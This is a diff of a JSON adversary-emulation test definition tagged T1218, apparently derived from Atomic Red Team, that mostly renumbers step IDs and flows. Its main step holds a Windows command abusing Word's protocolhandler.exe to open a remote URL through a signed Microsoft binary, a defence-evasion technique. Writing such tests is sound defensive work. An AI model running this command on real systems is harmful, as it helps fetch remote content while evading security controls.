@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "866049bb-3e91-460a-a39e-ba0639d350a4",
+      "id": "f2360a45-b46d-4c5b-b431-8c8db3c0ab7d",
       "type": "execute-command",
       "data": {
         "command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b\ncall \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|#{remote_url}\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "1b912c65-5e8c-4b8c-9a7e-c137f8eadbdf",
+      "id": "814f9a54-f68c-4207-bc7d-44b555ac14be",
       "name": "Check dependency 1/1",
       "description": "Microsoft Word must be installed\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "9a71415a-8b61-4f0c-89c3-42e62bd9f66b",
+      "id": "fb587357-b754-47b6-a74f-bbe50aa5c9f4",
       "name": "Resolve dependency 1/1",
       "description": "Microsoft Word must be installed\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "7c7a7b2f-e2cf-4303-b795-0c6ff72f11b7",
+      "id": "c7ffd9e1-46aa-4191-b097-0259ecc8852f",
       "name": "Re-check dependency 1/1",
       "description": "Microsoft Word must be installed\n",
       "type": "execute-command",
@@ -51,29 +51,28 @@
   ],
   "flows": [
     {
-      "s": "1b912c65-5e8c-4b8c-9a7e-c137f8eadbdf",
+      "s": "814f9a54-f68c-4207-bc7d-44b555ac14be",
       "p": "on-success",
-      "o": "866049bb-3e91-460a-a39e-ba0639d350a4"
+      "o": "f2360a45-b46d-4c5b-b431-8c8db3c0ab7d"
     },
     {
-      "s": "1b912c65-5e8c-4b8c-9a7e-c137f8eadbdf",
+      "s": "814f9a54-f68c-4207-bc7d-44b555ac14be",
       "p": "on-failure",
-      "o": "9a71415a-8b61-4f0c-89c3-42e62bd9f66b"
+      "o": "fb587357-b754-47b6-a74f-bbe50aa5c9f4"
     },
     {
-      "s": "9a71415a-8b61-4f0c-89c3-42e62bd9f66b",
+      "s": "fb587357-b754-47b6-a74f-bbe50aa5c9f4",
       "p": "on-success",
-      "o": "7c7a7b2f-e2cf-4303-b795-0c6ff72f11b7"
+      "o": "c7ffd9e1-46aa-4191-b097-0259ecc8852f"
     },
     {
-      "s": "7c7a7b2f-e2cf-4303-b795-0c6ff72f11b7",
+      "s": "c7ffd9e1-46aa-4191-b097-0259ecc8852f",
       "p": "on-failure",
-      "o": "866049bb-3e91-460a-a39e-ba0639d350a4"
+      "o": "f2360a45-b46d-4c5b-b431-8c8db3c0ab7d"
     }
   ],
   "tags": [
-    "T1218",
-    "atomic-red-team"
+    "T1218"
   ],
   "input_arguments": [
     {
